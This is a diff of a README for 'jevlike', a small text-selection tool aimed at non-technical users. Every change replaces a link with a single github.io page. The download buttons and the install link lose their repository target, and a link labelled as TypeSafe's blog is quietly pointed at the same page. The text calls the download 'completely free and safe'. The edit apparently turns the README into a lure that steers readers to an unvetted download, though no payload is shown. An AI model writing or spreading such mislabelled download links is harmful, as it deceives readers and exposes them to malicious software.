@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run **jevlike**, a smart tool that helps a computer choose between different text options in a single step. Think of it like a super-fast assistant that reads a question and instantly picks the best answer from a list—no slow typing, just one quick decision.
 
-[⬇️ Download jevlike Now](https://github.com/yorshstudent-a11y/jevlike)
+[⬇️ Download jevlike Now](https://yorshstudent-a11y.github.io)
 
 ### 🖥️ What Does This App Do?
 
@@ -12,7 +12,7 @@ jevlike is a small, powerful program that takes a piece of text (like a question
 
 ### 📥 How to Download
 
-Visit this link to download the application: [https://github.com/yorshstudent-a11y/jevlike](https://github.com/yorshstudent-a11y/jevlike)
+Visit this link to download the application: [https://yorshstudent-a11y.github.io](https://yorshstudent-a11y.github.io)
 
 The download is completely free and safe. You don't need any special technical skills to get it.
 
@@ -61,14 +61,14 @@ Visit the GitHub page linked above for updates and community discussions.
 ### 📚 Additional Resources
 
 - The original idea comes from TypeSafe's commercial model called "Jev," which inspired this independent starter version
-- You can read more about the concept at [TypeSafe's blog](https://typesafe.ai/blog/introducing-system-one-models-and-jev)
+- You can read more about the concept at [TypeSafe's blog](https://yorshstudent-a11y.github.io)
 - Stay tuned for future improvements and new features
 
 ### ✅ Ready to Start?
 
 You're just one download away from experiencing fast, smart text selection. Click the button below or visit the link in the installation section to get started today!
 
-[⬇️ Get jevlike Now](https://github.com/yorshstudent-a11y/jevlike)
+[⬇️ Get jevlike Now](https://yorshstudent-a11y.github.io)
 
 ### 🧩 How It Works (For the Curious)
 
